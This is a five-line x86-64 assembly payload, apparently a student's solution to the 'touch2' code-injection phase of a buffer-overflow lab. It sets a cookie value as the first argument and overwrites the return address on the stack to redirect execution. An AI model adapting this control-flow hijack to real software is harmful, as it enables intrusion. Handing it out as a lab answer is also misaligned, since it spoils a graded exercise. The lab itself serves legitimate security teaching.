movq $0x3fc5a122, %rdi  # give first arg my cookie
movq $0x401ba4, %rax
movq %rax, (%rsp)  # write touch2 address used for ret
ret
